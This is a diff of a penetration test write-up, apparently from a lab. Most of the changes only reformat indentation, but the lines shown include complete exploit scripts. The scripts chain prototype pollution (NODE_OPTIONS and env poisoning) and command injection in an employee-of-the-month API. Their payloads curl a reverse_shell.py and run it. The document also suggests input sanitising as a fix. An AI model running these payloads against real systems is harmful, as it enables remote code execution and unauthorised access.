@@ -11,7 +11,7 @@ The **penetration test report** can be downloaded [here].
 - [Performing basic username gathering from the website](#0x01 "- Performing basic username gathering from the website")
 - [Brute forcing the IMAP e-mail service](#0x02 "Brute forcing the IMAP e-mail service")
 - [Analyzing the found code and the vulnerabilities within it](#0x03 "Analyzing the found code and the vulnerabilities within it")
-- [Then manufacturing a **0 day**, and using it to **gain access** to the initial pivot machine.](0x04 "Then manufacturing a **0 day**, and using it to **gain access** to the initial pivot machine.")
+- [Then manufacturing a **0 day**, and using it to **gain access** to the initial pivot machine.](#0x04 "Then manufacturing a **0 day**, and using it to **gain access** to the initial pivot machine.")
 - [Maintaining persistence methods.](#0x06 "Maintaining persistence methods.")
 - [Gaining access to the domain.](#0x07 "Gaining access to the domain.")
 
@@ -244,9 +244,9 @@ A gadget provides a means of turning the prototype pollution vulnerability into 
 
 ```
 exports.updateProfile = (req, res) => {
-	const profile = JSON.parse(fs.readFileSync("./data.json"))
-	fs.writeFileSync("./data.json", JSON.stringify(merge(profile, req.body)))
-	res.sendStatus(204)
+  const profile = JSON.parse(fs.readFileSync("./data.json"))
+  fs.writeFileSync("./data.json", JSON.stringify(merge(profile, req.body)))
+  res.sendStatus(204)
 };
 ```
 
@@ -311,17 +311,17 @@ res = client.put(
   base_url + "/employee-of-the-month",
   headers={"cache-control": "no-cache"},
   json={
-	  "firstname": "Patrick",
-	  "lastname": "Richardson",
-	  "description": "Hello, I am Patrick Richardson! I've set up this API to display employees of the month!",
-	  "achievement": {
-	    "reason":"Setting up employee of the month API",
-	    "date":"2023-10-4 11:03:04"
-	  },
-	  "__proto__": {
-	    "pollution": "exists",
-	    "hello": "from pollution"
-	  }
+    "firstname": "Patrick",
+    "lastname": "Richardson",
+    "description": "Hello, I am Patrick Richardson! I've set up this API to display employees of the month!",
+    "achievement": {
+      "reason":"Setting up employee of the month API",
+      "date":"2023-10-4 11:03:04"
+    },
+    "__proto__": {
+      "pollution": "exists",
+      "hello": "from pollution"
+    }
   }
 )
 ```
@@ -358,10 +358,10 @@ Moving forward, we'll continue with poisoning the prototype env, and requiring t
 
 ```
   "__proto__": {
-	 "argv0": "/proc/self/exe",
-	 "shell": "/proc/self/exe",
-	 "env": { "get_rekt":f"console.log(require('child_process').execSync('touch /dev/shm/test').toString())//"},
-	 "NODE_OPTIONS" : "--require /proc/self/environ"
+   "argv0": "/proc/self/exe",
+   "shell": "/proc/self/exe",
+   "env": { "get_rekt":f"console.log(require('child_process').execSync('touch /dev/shm/test').toString())//"},
+   "NODE_OPTIONS" : "--require /proc/self/environ"
   }
 ```
 
@@ -399,35 +399,35 @@ This is our complete exploit:
 import httpx
 
 def exploit():
-	client = httpx.Client()
-	payload = "(curl http://localhost:8000/reverse_shell.py | python3) &"
-	base_url = "http://localhost:3000"
-	res = client.put(
-		base_url + "/employee-of-the-month",
-		headers={"cache-control": "no-cache"},
-		json={
-			"firstname": "Patrick",
-			"lastname": "Payloadson",	
-			"description": "Hello, I am Patrick Richardson! I've set up this API to display employees of the month!",
-			"achievement": {
-			"reason":"Setting up employee of the month API",
-			"date":"2023-10-4 11:03:04"
-			},
-			"__proto__": {
-				"argv0": "/proc/self/exe",
-				"shell": "/proc/self/exe",
-				"env": { 
-	"get_rekt":f"console.log(require('child_process').execSync(`{payload}`).toString())//"
-				},
-				"NODE_OPTIONS" : "--require /proc/self/environ"
-			}
-		}
-	)
-	
-	print(res, len(res.text))
-	
-	res = client.get(base_url + "/employee-of-the-month/badge/refresh", headers={"cache-control": "no-cache"})
-	print(res, len(res.text))
+  client = httpx.Client()
+  payload = "(curl http://localhost:8000/reverse_shell.py | python3) &"
+  base_url = "http://localhost:3000"
+  res = client.put(
+    base_url + "/employee-of-the-month",
+    headers={"cache-control": "no-cache"},
+    json={
+      "firstname": "Patrick",
+      "lastname": "Payloadson",	
+      "description": "Hello, I am Patrick Richardson! I've set up this API to display employees of the month!",
+      "achievement": {
+      "reason":"Setting up employee of the month API",
+      "date":"2023-10-4 11:03:04"
+      },
+      "__proto__": {
+        "argv0": "/proc/self/exe",
+        "shell": "/proc/self/exe",
+        "env": { 
+  "get_rekt":f"console.log(require('child_process').execSync(`{payload}`).toString())//"
+        },
+        "NODE_OPTIONS" : "--require /proc/self/environ"
+      }
+    }
+  )
+  
+  print(res, len(res.text))
+  
+  res = client.get(base_url + "/employee-of-the-month/badge/refresh", headers={"cache-control": "no-cache"})
+  print(res, len(res.text))
 
 exploit()
 ```
@@ -512,40 +512,40 @@ Let's poison the last name of our employee of the month, refresh the badge, and 
 import httpx
 
 def exploit():
-	client = httpx.Client()
-	base_url = "http://localhost:3000"
-	
-	def json(payload):
-		return {
-			"firstname": "Patrick",
-			"lastname": f"Payloadson {payload}",
-			"description": "Hello, I am Patrick Richardson! I've set up this API to display employees of the month!",
-			"achievement": {
-				"reason":"Setting up employee of the month API",
-				"date":"2023-10-4 11:03:04"
-			},
-		}
-	
-	payloadStageOne = "$(curl http://localhost:8000/reverse_shell.py -o /dev/shm/shell.py)"
-	payloadStageTwo = "$(python3 /dev/shm/shell.py)"
-	
-	res = client.put(
-		base_url + "/employee-of-the-month",
-		headers={"cache-control": "no-cache"},
-		json=json(payloadStageOne)
-	)
-	
-	res = client.get(base_url + "/employee-of-the-month/badge/refresh", headers={"cache-control": "no-cache"})
-	
-	print(res, len(res.text))
-	res = client.put(
-		base_url + "/employee-of-the-month",
-		headers={"cache-control": "no-cache"},
-		json=json(payloadStageTwo)
-	)
+  client = httpx.Client()
+  base_url = "http://localhost:3000"
+  
+  def json(payload):
+    return {
+      "firstname": "Patrick",
+      "lastname": f"Payloadson {payload}",
+      "description": "Hello, I am Patrick Richardson! I've set up this API to display employees of the month!",
+      "achievement": {
+        "reason":"Setting up employee of the month API",
+        "date":"2023-10-4 11:03:04"
+      },
+    }
+  
+  payloadStageOne = "$(curl http://localhost:8000/reverse_shell.py -o /dev/shm/shell.py)"
+  payloadStageTwo = "$(python3 /dev/shm/shell.py)"
+  
+  res = client.put(
+    base_url + "/employee-of-the-month",
+    headers={"cache-control": "no-cache"},
+    json=json(payloadStageOne)
+  )
+  
+  res = client.get(base_url + "/employee-of-the-month/badge/refresh", headers={"cache-control": "no-cache"})
+  
+  print(res, len(res.text))
+  res = client.put(
+    base_url + "/employee-of-the-month",
+    headers={"cache-control": "no-cache"},
+    json=json(payloadStageTwo)
+  )
 
-	res = client.get(base_url + "/employee-of-the-month/badge/refresh", headers={"cache-control": "no-cache"})
-	print(res, len(res.text))
+  res = client.get(base_url + "/employee-of-the-month/badge/refresh", headers={"cache-control": "no-cache"})
+  print(res, len(res.text))
 
 exploit()
 ```
@@ -564,8 +564,8 @@ If you must call OS commands with user-supplied input, strong input validation i
 
 ```javascript
 function sanitize(inputStr) { 
-	// Use a regular expression to match only alphanumeric characters
-	return inputStr.replace(/[^a-zA-Z0-9]/g, '');
+  // Use a regular expression to match only alphanumeric characters
+  return inputStr.replace(/[^a-zA-Z0-9]/g, '');
 }
 
 // Example usage: 
